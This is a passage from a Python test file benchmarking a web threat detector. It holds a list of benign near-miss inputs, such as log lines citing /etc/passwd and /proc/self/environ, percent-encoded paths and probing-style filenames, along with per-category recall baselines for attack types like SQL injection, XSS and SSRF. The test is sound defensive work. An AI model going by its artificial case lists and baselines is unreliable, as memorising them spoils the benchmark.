        "Reflection lets a program inspect its own types at runtime.",
    ),
    BenignCase(
        "code_injection_prose_process_class_mention",
        "The `Process` class in .NET wraps native OS process handles.",
    ),
    BenignCase(
        "code_injection_changelog_assembly_bump",
        "Bumped the shared `Assembly` version to 4.2.0 in this release.",
    ),
    BenignCase(
        "code_injection_prose_process_wrapper_explainer",
        "The `Process` class wraps native OS handles for spawning child processes.",
    ),
    BenignCase(
        "code_injection_prose_reflection_serialization",
        "Reflection-based serialization is slower than direct field access.",
    ),
    BenignCase(
        "benign_user_agent_chrome_windows",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    ),
    BenignCase(
        "benign_user_agent_iphone_safari",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) "
        "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 "
        "Safari/604.1",
    ),
    BenignCase("benign_user_agent_python_requests", "python-requests/2.31.0"),
    BenignCase("benign_user_agent_curl", "curl/8.4.0"),
    BenignCase(
        "benign_git_diff_snippet",
        "diff --git a/src/utils.py b/src/utils.py\n--- a/src/utils.py\n"
        "+++ b/src/utils.py\n@@ -10,7 +10,7 @@ def parse(x):\n"
        "-    return x.strip()\n+    return x.strip().lower()",
    ),
    BenignCase(
        "benign_json_semicolon_pipe_in_value",
        '{"description": "Use semicolons; separate values with pipes | when '
        'exporting CSV.", "id": 42}',
    ),
    BenignCase(
        "benign_oauth_redirect_callback",
        "https://app.example.com/oauth/callback?code=abc123&state=xyz789",
    ),
    BenignCase(
        "benign_s3_bucket_asset_url",
        "https://my-app-assets.s3.amazonaws.com/uploads/avatar-42.png",
    ),
    BenignCase(
        "benign_cdn_jsdelivr_url",
        "https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js",
    ),
    BenignCase("benign_file_path_var_www_html", "/var/www/html/index.html"),
    BenignCase(
        "benign_webhook_payment_succeeded",
        '{"event": "payment.succeeded", "data": {"amount": 4999, "currency": "usd"}}',
    ),
    BenignCase(
        "benign_changelog_version_entry",
        "3.11.2 - Fixed a race condition in the rate limiter and updated dependencies.",
    ),
    BenignCase(
        "benign_base64_wrapped_greeting",
        "token=R29vZCBtb3JuaW5nIHRlYW0sIHN0YW5kdXAgbm90ZXMgYXR0YWNoZWQgYmVsb3cu",
        "encoding_aware",
    ),
    BenignCase(
        "benign_base64_wrapped_receipt",
        "VGhhbmsgeW91IGZvciB5b3VyIHB1cmNoYXNlLCB5b3VyIG9yZGVyIHdpbGwgc2hpcCB3"
        "aXRoaW4gdHdvIGJ1c2luZXNzIGRheXMu",
        "encoding_aware",
    ),
    BenignCase(
        "benign_base64_wrapped_changelog",
        "UmVmYWN0b3JlZCB0aGUgYmlsbGluZyBtb2R1bGUgYW5kIGNsZWFuZWQgdXAgZGVhZCBj"
        "b2RlIGluIHRoZSBpbnZvaWNlIHBpcGVsaW5lLg==",
        "encoding_aware",
    ),
    BenignCase(
        "benign_past_truncation_cutoff_closing_sentence",
        _TRUNCATION_FILLER + "the end of this long benign report is just a "
        "closing sentence.",
        "encoding_aware",
    ),
    BenignCase(
        "sensitive_file_git_diff_ending_python_source",
        "diff --git a/src/utils.py b/src/utils.py\n--- a/src/utils.py\n"
        "+++ b/src/utils.py",
    ),
    BenignCase(
        "sensitive_file_log_line_ending_dotenv",
        "2026-08-11T10:22:03Z INFO deploy: copied template into /srv/app/.env",
    ),
    BenignCase(
        "sensitive_file_dockerfile_ending_python_source",
        "FROM python:3.12-slim\nWORKDIR /app\nCOPY requirements.txt .\n"
        "RUN pip install -r requirements.txt\nCOPY app/main.py /app/main.py",
    ),
    BenignCase(
        "sensitive_file_release_note_ending_config_yml",
        "Release 3.12.0 updates the default timeout values.\nSee infra/app-config.yml",
    ),
    BenignCase(
        "sensitive_file_cdn_note_ending_sourcemap",
        "Deploy pipeline uploaded new build artifacts.\nUploaded dist/bundle.js.map",
    ),
    BenignCase(
        "sensitive_file_shell_log_ending_deploy_sh",
        "Provisioning log:\nExecuted post-install hook scripts/deploy.sh",
    ),
    BenignCase(
        "sensitive_file_release_note_ending_go_source",
        "Refactored the payments module for clarity.\n"
        "Updated services/payments/handler.go",
    ),
    BenignCase(
        "sensitive_file_changelog_ending_sql_migration",
        "3.12.0 changelog:\n- Added index on users table\n"
        "Run the migration via db/migrate.sql",
    ),
    BenignCase(
        "sensitive_file_multiline_ending_git_dir",
        "Build artifacts were generated inside a scratch checkout at /tmp/build/.git",
    ),
    BenignCase(
        "sensitive_file_json_payload_ending_source_path",
        '{"event": "file_watch", "changed": true, "path": "/opt/app/worker.py"}',
    ),
    BenignCase(
        "sensitive_file_stack_trace_ending_source_path",
        "Unhandled exception while loading configuration.\n"
        "  at bootstrap (app/bootstrap.js:12)\n"
        "  at Module._compile (module.js:456)\n"
        "Failed to load /app/config/settings.py",
    ),
    BenignCase(
        "requirements_txt_style_multiline_benign",
        "flask==3.0.3\nrequests==2.32.3\npydantic==2.9.2\nredis==5.0.8\nhttpx==0.27.2",
    ),
    BenignCase(
        "dir_traversal_incident_note_ending_etc_passwd",
        "Investigating auth issues.\nUser confirmed the target file was /etc/passwd",
    ),
    BenignCase(
        "dir_traversal_incident_note_midline_etc_passwd",
        "Investigating auth issues.\n"
        "User confirmed the target file was /etc/passwd\n"
        "Ticket resolved, closing now.",
    ),
    BenignCase(
        "dir_traversal_setup_log_ending_win_ini",
        "Setup log:\nBackup restored win.ini",
    ),
    BenignCase(
        "dir_traversal_debug_trace_ending_proc_environ",
        "Debug trace:\nDumped /proc/self/environ",
    ),
    BenignCase(
        "dir_traversal_ops_report_ending_var_log",
        "Report:\nRotated /var/log/nginx",
    ),
    BenignCase(
        "path_traversal_url_note_ending_percent2f",
        "Redirect target uses percent-encoding.\n"
        "User was redirected to %2Fadmin%2Fsettings",
    ),
    BenignCase(
        "path_traversal_changelog_ending_percent_encoded_space",
        "Release notes:\n- Fixed a bug in URL decoding\n"
        "Example input now renders as hello%20world",
    ),
    BenignCase(
        "file_inclusion_release_notes_ending_https_url",
        "3.12.0 changelog:\n- Bumped the CDN asset pipeline\n"
        "New script tag points to https://cdn.example.com/app.js",
    ),
    BenignCase(
        "file_inclusion_docs_ending_ftp_url",
        "Legacy download docs:\n"
        "Older clients should use ftp://ftp.example.com/pub/readme.txt",
    ),
    BenignCase(
        "sqli_orderby_pagination_note_multiline",
        "Migration notes:\nFor pagination consistency, always ORDER BY 2\n"
        "before paginating results.",
    ),
    BenignCase(
        "sqli_shell_comment_hash_multiline",
        "Example shell command:\necho 'debug' #\nEnables verbose output.",
    ),
    BenignCase(
        "cmd_injection_shell_script_excerpt_multiline",
        "Deployment script:\nsh -x deploy.sh\necho done",
    ),
    BenignCase(
        "cms_probing_role_list_administrator_multiline",
        "Available roles for this workspace:\nadministrator\neditor\nviewer\n"
        "Contact support for role changes.",
    ),
    BenignCase(
        "cms_probing_deprecated_scripts_list_multiline",
        "Deprecated scripts:\ntest.php\ninfo.php\nRemove these before production.",
    ),
    BenignCase(
        "cms_probing_cleanup_backup_files_multiline",
        "Files pending cleanup:\nsettings.py.orig\ndata.tmp\n"
        "Please review before merge.",
    ),
    BenignCase(
        "cms_probing_gitignore_style_list_multiline",
        "Files to ignore in this repo:\n.DS_Store\nThumbs.db\n.npmrc\n"
        "Add more as needed.",
    ),
    BenignCase(
        "recon_retired_pages_list_multiline",
        "Legacy pages retired this quarter:\nhome.shtml\ncontact.cgi\n"
        "Reach out with questions.",
    ),
    BenignCase(
        "recon_api_routes_doc_multiline",
        "Internal routes reference:\n/version\n/health\n/metrics",
    ),
    BenignCase(
        "recon_endpoints_list_multiline",
        "Endpoints exposed by this service:\nactuator\nswagger-ui\n"
        "Remove before going to prod.",
    ),
    BenignCase(
        "recon_internal_tools_list_multiline",
        "Internal tools we use:\nconfluence\nhelpdesk\njira",
    ),
    BenignCase(
        "recon_legacy_cgi_paths_doc_multiline",
        "Legacy web server paths still referenced in docs:\n"
        "cgi-bin/old-form.cgi\nDo not use in new code.",
    ),
    BenignCase(
        "recon_iot_audit_findings_multiline",
        "IoT device audit findings:\nHNAP1\nIPCamDesc.xml\n"
        "Flagged for firmware update.",
    ),
    BenignCase(
        "recon_i18n_routes_doc_multiline",
        "Supported i18n routes:\n/languages/en\n/languages/fr\n"
        "Add more locales as needed.",
    ),
    BenignCase(
        "recon_vendor_inventory_multiline",
        "Vendor systems inventory:\nsap\nwsman\nDecommission by Q3.",
    ),
    BenignCase(
        "recon_bot_integrations_list_multiline",
        "Bot integrations enabled:\n.clawdbot\nRemove unused integrations.",
    ),
    BenignCase(
        "recon_spanish_routes_doc_multiline",
        "Spanish site routes:\n/inicio\n/indice\nTranslate remaining pages.",
    ),
    BenignCase(
        "recon_dev_tooling_folders_multiline",
        "Dev tooling folders in this repo:\n.streamlit\n.devcontainer\n"
        "Add to .gitignore.",
    ),
    BenignCase(
        "recon_build_files_pr_multiline",
        "Build files added in this PR:\nDockerfile\nMakefile\nJenkinsfile\n"
        "Ready for review.",
    ),
    BenignCase(
        "recon_removed_secrets_files_multiline",
        "Files removed for security reasons:\nold_secrets.yml\n"
        "legacy_credentials.json\nAudit complete.",
    ),
    BenignCase(
        "recon_proxy_autodiscover_paths_multiline",
        "Exchange-related paths in our proxy config:\nautodiscover/\n"
        "Do not cache these responses.",
    ),
    BenignCase(
        "recon_doh_endpoints_doc_multiline",
        "DoH endpoints supported:\n/dns-query\nSee RFC 8484 for details.",
    ),
    BenignCase(
        "recon_git_troubleshooting_note_multiline",
        "Git repo troubleshooting notes:\nCorruption found in:\n"
        ".git/objects\n.git/refs\nRan git fsck to repair.",
    ),
]

BASELINE_MALICIOUS_DETECTED_BY_CATEGORY: dict[str, int] = {
    "cmd_injection": 19,
    "cms_probing": 8,
    "code_injection": 3,
    "dir_traversal": 6,
    "file_inclusion": 8,
    "file_upload": 6,
    "http_split": 4,
    "ldap": 4,
    "nosql": 6,
    "path_traversal": 5,
    "proto_pollution": 5,
    "recon": 12,
    "sensitive_file": 6,
    "sqli": 15,
    "ssrf": 15,
    "template": 6,
    "xml": 4,
    "xss": 14,
}
BASELINE_MALICIOUS_DETECTED_TOTAL = 146

BASELINE_BENIGN_FALSE_POSITIVE_BY_CATEGORY: dict[str, int] = {}
BASELINE_BENIGN_FALSE_POSITIVE_TOTAL = 0


async def _malicious_case_detected_categories(case: MaliciousCase) -> set[str]:
    detector = _DETECTORS[case.detector]
    result = await detector.detect(
        content=case.payload, ip_address="203.0.113.9", context="request_body"
    )
    if not result["is_threat"]:
        return set()
    return {threat.get("category") for threat in result["threats"]}


async def _benign_case_flagged_categories(case: BenignCase) -> set[str]:
    detector = _DETECTORS[case.detector]
    result = await detector.detect(
        content=case.payload, ip_address="198.51.100.4", context="request_body"
    )
    if not result["is_threat"]:
        return set()
    return {threat.get("category") for threat in result["threats"]}


def _fraction(numerator: int, denominator: int) -> str:
    percentage = 100.0 * numerator / denominator if denominator else 0.0
    return f"{numerator}/{denominator} ({percentage:.1f}%)"


def _build_report(
    malicious_detected_by_category: dict[str, int],
    malicious_total_by_category: dict[str, int],
    benign_flagged_by_category: dict[str, int],
    benign_total: int,
    malicious_detected_total: int,
    malicious_total: int,
    benign_flagged_total: int,
    wall_time_seconds: float,
) -> str:
    lines = [
        "DETECTION BENCHMARK REPORT",
        f"malicious corpus: {malicious_total} cases across "
        f"{len(malicious_total_by_category)} categories, "
        f"{sum(1 for c in MALICIOUS_CORPUS if c.known_gap_reason)} documented "
        "known gaps",
        f"benign corpus: {benign_total} cases, "
        f"{sum(1 for c in BENIGN_CORPUS if c.known_false_positive_reason)} "
        "documented known false positives",
        f"wall time: {wall_time_seconds:.3f}s",
        "",
        "per-category recall (detected/total):",
    ]
    for category in sorted(malicious_total_by_category):
        detected = malicious_detected_by_category.get(category, 0)
        total = malicious_total_by_category[category]
        lines.append(f"  {category:16} {_fraction(detected, total)}")
    lines.append("")
    lines.append("per-category false-positive attribution (benign hits/total benign):")
    for category in sorted(ALL_DETECTION_CATEGORIES):
        flagged = benign_flagged_by_category.get(category, 0)
        lines.append(f"  {category:16} {_fraction(flagged, benign_total)}")
    lines.append("")
    lines.append(
        f"total recall:    {_fraction(malicious_detected_total, malicious_total)}"
    )
    lines.append(f"total fp rate:   {_fraction(benign_flagged_total, benign_total)}")
    lines.append("")
    lines.append("known gaps (documented, still counted in the denominator):")
    for malicious_case in MALICIOUS_CORPUS:
        if malicious_case.known_gap_reason:
            lines.append(
                f"  {malicious_case.case_id} [{malicious_case.category}]: "
                f"{malicious_case.known_gap_reason}"
            )
    lines.append("")
    lines.append(
        "known false positives (documented, still counted in the denominator):"
    )
    for benign_case in BENIGN_CORPUS:
        if benign_case.known_false_positive_reason:
            lines.append(
                f"  {benign_case.case_id}: {benign_case.known_false_positive_reason}"
            )
    return "\n".join(lines)


@pytest.mark.asyncio
async def test_detection_benchmark_recall_and_false_positive_rate() -> None:
    assert len(MALICIOUS_CORPUS) >= 120
    assert len(BENIGN_CORPUS) >= 120
    assert len(MALICIOUS_CORPUS) == len(
        {malicious_case.case_id for malicious_case in MALICIOUS_CORPUS}
    )
    assert len(BENIGN_CORPUS) == len(
        {benign_case.case_id for benign_case in BENIGN_CORPUS}
    )
    assert {
        malicious_case.category for malicious_case in MALICIOUS_CORPUS
    } == ALL_DETECTION_CATEGORIES
    assert set(BASELINE_MALICIOUS_DETECTED_BY_CATEGORY) == ALL_DETECTION_CATEGORIES

    start = time.monotonic()

    malicious_detected_by_category: dict[str, int] = {}
    malicious_total_by_category: dict[str, int] = {}
    undetected_case_ids_by_category: dict[str, list[str]] = {}
    for malicious_case in MALICIOUS_CORPUS:
        malicious_total_by_category[malicious_case.category] = (
            malicious_total_by_category.get(malicious_case.category, 0) + 1
        )
        hit_categories = await _malicious_case_detected_categories(malicious_case)
        if malicious_case.category in hit_categories:
            malicious_detected_by_category[malicious_case.category] = (
                malicious_detected_by_category.get(malicious_case.category, 0) + 1
            )
        else:
            undetected_case_ids_by_category.setdefault(
                malicious_case.category, []
            ).append(malicious_case.case_id)

    benign_flagged_by_category: dict[str, int] = {}
    benign_flagged_total = 0
    unexpected_false_positive_case_ids: list[str] = []
    for benign_case in BENIGN_CORPUS:
        hit_categories = await _benign_case_flagged_categories(benign_case)
        if hit_categories:
            benign_flagged_total += 1
            if not benign_case.known_false_positive_reason:
                unexpected_false_positive_case_ids.append(benign_case.case_id)
            for category in hit_categories:
                benign_flagged_by_category[category] = (
                    benign_flagged_by_category.get(category, 0) + 1
                )

    wall_time_seconds = time.monotonic() - start

    malicious_detected_total = sum(malicious_detected_by_category.values())

    report = _build_report(
        malicious_detected_by_category,
        malicious_total_by_category,
        benign_flagged_by_category,
        len(BENIGN_CORPUS),
        malicious_detected_total,
        len(MALICIOUS_CORPUS),
        benign_flagged_total,
        wall_time_seconds,
    )
    print(report)

    for category, baseline_detected in BASELINE_MALICIOUS_DETECTED_BY_CATEGORY.items():
        actual_detected = malicious_detected_by_category.get(category, 0)
        assert actual_detected >= baseline_detected, (
            f"{category} recall regressed: baseline={baseline_detected} "
            f"actual={actual_detected} "
            f"newly_undetected={undetected_case_ids_by_category.get(category, [])}\n"
            f"{report}"
        )

    assert malicious_detected_total >= BASELINE_MALICIOUS_DETECTED_TOTAL, (
        f"overall recall regressed: baseline={BASELINE_MALICIOUS_DETECTED_TOTAL} "
        f"actual={malicious_detected_total}\n{report}"
    )

    for category in sorted(ALL_DETECTION_CATEGORIES):
        baseline_fp = BASELINE_BENIGN_FALSE_POSITIVE_BY_CATEGORY.get(category, 0)
        actual_fp = benign_flagged_by_category.get(category, 0)
        assert actual_fp <= baseline_fp, (
            f"{category} false-positive attribution rose: baseline={baseline_fp} "
            f"actual={actual_fp}\n{report}"
        )

    assert benign_flagged_total <= BASELINE_BENIGN_FALSE_POSITIVE_TOTAL, (
        f"overall false-positive rate rose: "
        f"baseline={BASELINE_BENIGN_FALSE_POSITIVE_TOTAL} "
        f"actual={benign_flagged_total} "
        f"unexpected={unexpected_false_positive_case_ids}\n{report}"
    )
